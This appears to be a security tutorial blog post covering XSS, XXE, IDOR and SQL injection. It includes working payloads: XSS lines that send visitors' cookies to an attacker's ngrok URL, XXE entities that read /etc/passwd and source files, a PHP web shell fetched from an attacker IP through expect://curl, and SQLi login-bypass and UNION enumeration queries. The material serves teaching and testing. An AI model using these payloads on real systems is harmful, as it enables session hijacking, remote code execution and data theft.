---
title: Notes | Common Web Attacks
author: BatBato
date: 2022-09-11
categories: [Notes, Common Web Attacks]
tags: [Web, Common Web Attacks, XSS, XXE, IDOR, SQLi]
permalink: /Notes/Web/Common_Web_Attacks
---

# Common Web Attacks

The World Wide Web allows us to access a lot of information over the internet, whether it is a movie, your family pictures or your mail. This is also a very big battlefield between every kind of hackers. Here, we are going to talk about common web vulnerabilities such as Cross Site Scripting (```XSS```), XML External Entity (```XXE```), Insecure Direct Object Reference (```IDOR```) and SQL Injection (```SQLi```).

## XSS

XSS vulnerability result in the possibility for a user to execute Java Script code in the web page. This can change the content of the page or steal connection cookies, for example. You can find a basic exmplanation of XSS on [this video](https://www.youtube.com/watch?v=L5l9lSnNMxg). There are three different type of XSS :

- [Reflected XSS](/Notes/Web/Common_Web_Attacks#reflected-xss), where the malicious script comes from the current HTTP request.
- [Stored XSS](/Notes/Web/Common_Web_Attacks#stored-xss), where the malicious script comes from the website's database.
- [DOM-based XSS](/Notes/Web/Common_Web_Attacks#dom-based-xss), where the vulnerability exists in client-side code rather than server-side code.


### Reflected XSS

The most basic type of cross-site scripting is ```Reflected XSS```. It occurs when an application receives data from an HTTP request and unsafely incorporates that data into the immediate response.

A very simple example will be the following. Imagine a webpage that ask for the user name and execute the following ```GET``` request :

```console
https://insecure-website.com/search?name=bob
```

This request will then print ```Your name is : NAME``` where ```NAME``` will be replaced by the name given. If the website is vulnerable to ```Reflected XSS```, we could put a script as a name like :

```console
https://insecure-website.com/search?name=<script>JS_CODE</script>
```

You can replace ```JS_CODE``` by anything you want. A basic test could be :

```php
<script>alert(1)</script>
```

The ```alert``` JS function will create a pop-up that will display the text between the brackets. But as stated in [this video](https://www.youtube.com/watch?v=KHwVjzWei1c) of [LiveOverflow](https://www.youtube.com/c/LiveOverflow), the ```alert(1)``` isn't a good practice and can lead to false positive. A better way to test XSS could be the use of ```alert(document.domain)``` or ```alert(windows.origin)``` you could even use the ```console.log``` JS function.


### Stored XSS

```Second-order``` or ```persistent XSS```, often known as ```Stored XSS```, occurs when an application obtains data from an unreliable source and includes that data inadvertently in subsequent HTTP responses.

As its name suggest, the ```Stored XSS``` is ```Stored``` in the server. It often appears when someone leaves a comment and that other people can read it. The attack is basically the same for every type of XSS so you can use the previous techniques to check if the website is vulnerable. 

### DOM-based XSS

When client-side JavaScript in an application handles data from an untrusted source in an unsafe manner, typically by publishing the data back to the DOM, this is referred to as ```DOM-based XSS```, also known as ```DOM XSS```.

```DOM-based XSS``` are a bit harder to find. First we want to check for JS code in the page that we can interact with, like a ```document.write``` that write our input, for example. ```DOM.innerHTML``` and ```DOM.outerHTML``` are other JS function that write DOM objects (```add()```, ```after()```, ```append()``` are some JQuery functions that write DOM objects). Once we understand how the script work we may want to close some HTML tags so that we can input our JS malicious code. This is an example that show how to close a simple HTML tag that includes our input in its field (like an image for example) :

```console
https://insecure-website.com/search?name="><script>JS_CODE</script>
```

> You can find more detailed information about XSS on the [PortSwigger website](https://portswigger.net/web-security/cross-site-scripting).
{: .prompt-info }

> You can use the ```document.cookie``` JS function to retrieve the cookie of a user.
{: .prompt-tip }

### Session Hijaking

XSS can be used to recover sensitive information like connection cookies. We need to setup our environment so that the payload can send us back the information. First, we will start a ```php server``` on our machine and then use ```ngrok``` so that our web server is available anywhere online.

```sh
php -S localhost:1234
```

and

```sh
ngrok http 1234
```

> In real case scenario or in realistic CTF you may want to use a more standard port like ```443``` which is the port for ```HTTPS```
{: .prompt-tip }

> You may need to create a Ngrok account for this to work. Visit the created page and it should ask you to create an account.
{: .prompt-danger }

Now that our environment is ready we can send our payload like :

```php
<script>window.open("[URL]?"+document.cookie)</script>
``` 

or

```php
<script>document.location="[URL]?"+document.cookie;</script>
``` 

or

```php
<script>document.write('<img src="[URL]?'+document.cookie+'"/>');</script>
``` 

Don't forget to replace ```[URL]``` by the url ngrok gives you. This will send the cookie of the person that visit the page where our payload is executed.
You can find many other payload on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md).

### Automation

There are many tools out here that can help you detect XSS vulnerabilities like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), [ZAP](https://owasp.org/www-project-zap/). There are also some opensource tools that you can find on github like [XSStrike](https://github.com/s0md3v/XSStrike), [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) or [XSSer](https://github.com/epsylon/xsser).
Here is a list of different payload you may want to try when looking for XSS vulnerabilities [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md).

---

## XXE

```XML eXternal Entity``` injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. This allows an attackers to interact with any back-end or external systems that the program itself can access as well as examine files on the application server disk.

By using the XXE vulnerability to launch ```Server-Side Request Forgery``` (SSRF) attacks, an attacker may be able to escalate a XXE assault to compromise the underlying server or other back-end infrastructure in some circumstances.

```Extensible Markup Language``` (XML) is a markup language and file format for ```storing```, ```transmitting```, and ```reconstructing arbitrary data```. It defines a set of rules for encoding documents in a format that is both ```human-readable``` and ```machine-readable```.

Here is a list of some of the key elements of an XML document :

| Key | Definition | Example |
| --- | ---------- | ------- |
| Tag | The keys of an XML document, usually wrapped with (</>) characters. | \<date\> |
| Entity | XML variables, usually wrapped with (&/;) characters. | &lt; |
| Element | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | \<date\>20-10-2022\</date\> |
| Attribute | Optional specifications for any element that are stored in the tags, which may be used by the XML parser. | version="1.0"/encoding="UTF-8" |
| Declaration | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. | \<?xml version="1.0" encoding="UTF-8"?\> |

### DTD

The XML ```Document Type Definition``` (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The ```DTD``` is declared within the optional ```DOCTYPE``` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an ```internal DTD```) or can be loaded from elsewhere (known as an ```external DTD```) or can be hybrid of the two. 


### XML Entities

In XML, we can create custom entities that can be defined within the DTD :
```xml
<!DOCTYPE foo [ <!ENTITY entity_ref "my value" > ]>
```

This definition means that any usage of the entity reference ```&entity_ref```; within the XML document will be replaced with the defined value: ```my value```. 

External entities can be used with the ```SYSTEM``` attribute. We can access files or resources from other websites :

```xml
<!DOCTYPE foo [ <!ENTITY ext_entity SYSTEM "http://website.com" > ]>
```

or

```xml
<!DOCTYPE foo [ <!ENTITY ext_entity SYSTEM "file:///path/to/file" > ]>
```

> This can allow us to access files such as the ```passwd``` one like this : ```<!ENTITY read SYSTEM 'file:///etc/passwd'>```
{: .prompt-tip }


### Usage

First of all, we need to intercept a request made to the server to see if our request has its data written in XML.
Then we need to spot where we can use a XXE. If you fill out a form and they tell you something like "an email has been sent to XXX@YYY.com" then you may need to exploit the email part of the form. We now can use a simple payload to see if it's vulnerable like :
```xml
<!DOCTYPE email [
  <!ENTITY user_mail "Test Text">
]>
```

Now if the previous text says "an email has been sent to Test Text" it may be vulnerable. We can now use the same technic to read files like we saw previously. But if we try to read the source code of a ```.php``` file it may not work because it will print the page instead of its source code. To read is source code, we can use the [PHP Wrapper](/Notes/Web/Command_Injection#data-wrapper) technic :

```xml
<!DOCTYPE email [
  <!ENTITY user_mail SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

This command will print the source code of ```index.php``` encoded in  ```base64```. You can use online tools such as [base64decode.org](https://www.base64decode.org/), the [BurpSuite Decoder](https://portswigger.net/burp/documentation/desktop/tools/decoder) or the bash command to decode it :

```sh
echo "BASE64_ENCODED_TEXT" | base64 -d 
```

You can use the [Exept Wrapper](https://nouman404.github.io/Notes/Web/Command_Injection#except-wrapper) to create a RCE with the basic ```expect://id``` or like that :

1. Create a php shell :

```sh
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
```

2. Create a web server to host our php shell

```sh
sudo python3 -m http.server 80
```

3. Use the XXE to upload our shell

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY user_mail SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```

---

## IDOR

```Insecure direct object references``` (IDOR) are a type of [access control](https://portswigger.net/web-security/access-control) vulnerability that arises when an application uses user-supplied input to access objects directly.

A typical example would be a get parametter that isn't sanitized :

```console
http://insecure_website/index.php?user_id=43
```

If we are the user with the ```ID 43``` what could possibly happen if we change this value to ```0``` or ```1``` ? Generally the first user is the admin.
Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. For example, if the ID we specify is for the number of a page. It's all about weak access control system. 

> You can read more about access control [here](https://portswigger.net/web-security/access-control)
{: .prompt-info}

When looking, like here, for ```ID```, ```name``` or any other type of ```token``` we may want to automate the process so we don't do all the research by hand. We can use tools such as the ```Burp Intruder```, the ```ZAP fuzzer``` or even tools such as ```ffuf```. 

---

## SQLi

SQL is a language that allows us to ask information to a database. This information can be name, adress, date, password... It can be anything we want. These queries are made in a DBMS (```DataBase Management System```), the most famous are ```SQLite```, ```MySQL```, ```MariaDB```, ```Microsoft SQL Server``` or even ```Oracle DBMS```. The goal here is not to teach you how SQL work or what are all the differences between tow DBMS but you can read [this article](https://www.altexsoft.com/blog/business/comparing-database-management-systems-mysql-postgresql-mssql-server-mongodb-elasticsearch-and-others/) for more information. We are just going to see the bases so you are not completely lost but I advise you to follow some courses about the SQL language.

### Definition

For this example, we are going to imagine a database of a school with professors and students:

![image](https://user-images.githubusercontent.com/73934639/189689960-0ecc2be0-e986-41d8-ba71-6448a65c4c18.png){: width="600" height="300" }

As you can see there are two teachers and two students. Professor and Teacher are the two ```tables``` of the database. It can be seen as an array containing different data. Each one has an id, a name and a surname those are the ```attributes``` ot the tables. ```ID``` is usually used to differentiate two ```entry``` of a table. We could have a student and a professor that have the same name and the same surname. If this happens and we don't have an ```ID``` how can we differentiate them ? For each ```entry```, we have several ```value```. For the first professor, the ```value``` for the id is ```1```, for the name it's ```name1``` and for the surname it's ```sur1```. As I said, ID need to be different to differentiate two students or two professors but I'm talking about ID of a certain ```table```. Of course ```we can have a student with the same ID as a professor``` because they are not in the same table.

### Basic SQL Commands

Now that you have a better understanding of a database, we can look on how to recover that data. The most common way is to recover all entries of a table :

```sql
SELECT * FROM STUDENT;
```

If we want to look for specific attributes, we can do :

```sql
SELECT name, surname FROM STUDENT;
```

Here we don't have much student but if we had hundred of them, we could display all students that have an id greater than 50 like this :

```sql
SELECT name, surname FROM STUDENT WHERE id > 50 ;
```

As I said previously, we are not going in depth into SQL and it's query so you may want to look at some online courses about the SQL language and its queries.

> Note that SQL queries isn't case sensitive. It means that you can write ```SELECT``` or ```select```.
{: .prompt-note }

### Common SQLi

The most common SQLi is in connection forms. You are asked to give a username and password. If I enter my credentials, the query may look like the following one and if there is no entry returned, it means that I gave a wrong password and/or a wrong user.

```sql
SELECT * FROM usertable WHERE profileID='batbato' AND password = 'batbato'
```

But what happens if I put as a user an apostrophe (```'```) ? The query will look like :

```sql
SELECT * FROM usertable WHERE profileID=''' AND password = 'batbato'
```

> Note that inputting an apostrophe (```'```) or a quote (```"```) can print an error message if the debugger mode has not been disabled.
{: .prompt-tip }

This will result in an error. But we can comment on the rest of the command so that the command will only look for the username. Comments can be ```-- -COMMENT``` or ```#COMMENT```.

```sql
SELECT * FROM usertable WHERE profileID='admin' -- -' AND password = 'batbato'
```

This command where our user is ```admin' -- -``` is equivalent to :

```sql
SELECT * FROM usertable WHERE profileID='admin'
```

But what if the admin username isn't "admin" ? We can use the well-known payload ```OR 1=1``` (equivalent to ```OR True```) so that we get the first user :

```sql
SELECT * FROM usertable WHERE profileID='admin' OR 1=1 -- -' AND password = 'batbato'
```

> Note that the apostrophe is important ! If the ```profileID``` is a decimal, it may not require an apostrophe and if the query use quote (```"```) then your payload should contain quotes instead of apostrophes.
{: .prompt-warning }

### UNION

In SQL, we can use the ```UNION``` to combine the result-set of two or more ```SELECT``` statements.
ex:
```sql
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2; 
```
Instead of the connection form, here we are going to look at something like a search bar. First we need to look for the number of columns of the query. We will try to input :

```sql
' UNION SELECT NULL -- -
```

If this doesn't print ```NULL```, we can try :

```sql
' UNION SELECT NULL, NULL -- -
```

Again and again until we see the ```NULL``` where the result should be output. For the rest of the example we are going to assume we have two columns.
We look for the name of the database with ```schema_name``` from the table ```INFORMATION_SCHEMA.SCHEMATA```:

```sql
' UNION SELECT 1,schema_name FROM INFORMATION_SCHEMA.SCHEMATA -- -
```

We obtain all the databases names. Image we found the database ```SCHOOL``` from the previous example. We look for the tables it contains :

```sql
' UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='SCHOOL' -- -
```

If we want to have a look at the ```Student``` table, we can list the names of the columns like that :

```sql
' UNION SELECT COLUMN_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='Student' -- -
```

We get the name and the surname with :

```sql
' UNION SELECT name, surname FROM Student -- -
```

If there are some protections, you can try to bypass them by encoding your queries, changing the case... This [PortSwigger article](https://portswigger.net/support/sql-injection-bypassing-common-filters) can explain it to you.
